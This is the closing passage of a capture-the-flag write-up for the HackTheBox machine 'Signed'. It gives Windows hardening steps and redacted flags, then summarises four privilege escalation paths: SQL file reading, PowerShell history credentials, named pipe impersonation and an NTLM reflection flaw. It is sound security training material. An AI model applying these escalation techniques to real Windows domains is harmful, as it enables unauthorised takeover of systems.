3.  **Enable Extended Protection for Authentication:**

    ```powershell
    # For WinRM
    Set-Item WSMan:\localhost\Service\Auth\CbtHardeningLevel -Value "Strict"
    ```
4. **Implement Network Segmentation:**
   * Separate management network
   * Firewall rules between VLANs
   * Restrict WinRM to management subnet
5.  **Monitor DNS Changes:**

    ```powershell
    # Enable DNS audit logging
    Set-DnsServerDiagnostics -LogLevel 0x8100F331
    ```

***

#### For PowerShell History Protection

1.  **Clear PowerShell History Regularly:**

    ```powershell
    Remove-Item (Get-PSReadlineOption).HistorySavePath
    ```
2.  **Disable PowerShell History:**

    ```powershell
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
    ```
3.  **Never Use Plaintext Passwords in Commands:**

    ```powershell
    # Bad - visible in history
    $password = "PlaintextPassword"

    # Good - prompt securely
    $securePassword = Read-Host "Enter password" -AsSecureString
    ```
4.  **Monitor PowerShell Script Block Logging:**

    ```powershell
    # Enable script block logging
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    ```
5. **Implement JEA (Just Enough Administration):**
   * Limit cmdlets available to users
   * Constrained language mode
   * Session configurations

***

#### For Named Pipe Security

1.  **Monitor Named Pipe Creation:**

    ```powershell
    # Sysmon Event ID 17 and 18
    # Monitor for suspicious pipe names
    ```
2. **Restrict SeImpersonatePrivilege:**
   * Only grant to necessary service accounts
   * Use gMSA with minimal privileges
   * Regular privilege audits
3.  **Enable Credential Guard:**

    ```powershell
    # Prevents many token theft attacks
    # Requires UEFI and hardware support
    ```
4.  **Implement Attack Surface Reduction:**

    ```powershell
    # Block abuse of exploited vulnerable signed drivers
    Set-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce5 -AttackSurfaceReductionRules_Actions Enabled
    ```

***

***

### Final Flags

**User Flag:**

```
Location: C:\Users\mssqlsvc\Desktop\user.txt
Flag: ea4f45xxxxxxxxxxxxxxxxxxxxxxx
```

**Root Flag:**

```
Location: C:\Users\Administrator\Desktop\root.txt
Flag: 9a8b7cxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Obtained via:
- Method 1: OPENROWSET file reading
- Method 2: PowerShell history credentials
- Method 3: Named pipe impersonation
- Method 4: NTLM reflection (intended)
```

***

### Conclusion

The Signed HackTheBox machine provided an excellent opportunity to explore multiple privilege escalation techniques in a Windows Active Directory environment. Each method demonstrated different aspects of Windows security:

**Method 1** showcased the power of Kerberos ticket manipulation and SQL Server file access capabilities.

**Method 2** highlighted the importance of operational security and the risks of leaving credentials in command history.

**Method 3** demonstrated advanced Windows internals knowledge, including security tokens and named pipe impersonation.

**Method 4** explored a cutting-edge vulnerability (CVE-2025-33073) that bypasses traditional NTLM reflection protections through DNS manipulation and cross-protocol relay.

All four methods successfully achieved the goal of obtaining SYSTEM or Administrator level access, but through vastly different attack paths. This demonstrates that defense in depth is critical - relying on a single security control is insufficient when multiple attack vectors exist.

The machine effectively illustrated real-world scenarios where misconfigurations, weak passwords, and unpatched vulnerabilities can lead to complete domain compromise. The intended solution (Method 4) particularly emphasized the importance of staying current with the latest security research and vulnerabilities.

**Takeaways:**

1. Service account passwords must be strong and managed properly
2. Extended stored procedures in SQL Server present significant attack surface
3. Kerberos ticket forgery remains a powerful technique
4. PowerShell history should be protected or cleared regularly
5. SeImpersonatePrivilege is extremely dangerous when granted to service accounts
6. Cross-protocol attacks can bypass protocol-specific defenses
7. DNS security is often overlooked but critical
8. Multiple attack paths increase likelihood of successful compromise
9. Patching and configuration management are essential
10. Security monitoring must cover all layers of the environment

This writeup has demonstrated comprehensive penetration testing methodology, from initial reconnaissance through multiple privilege escalation techniques, all while explaining the technical details and security implications of each step.

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
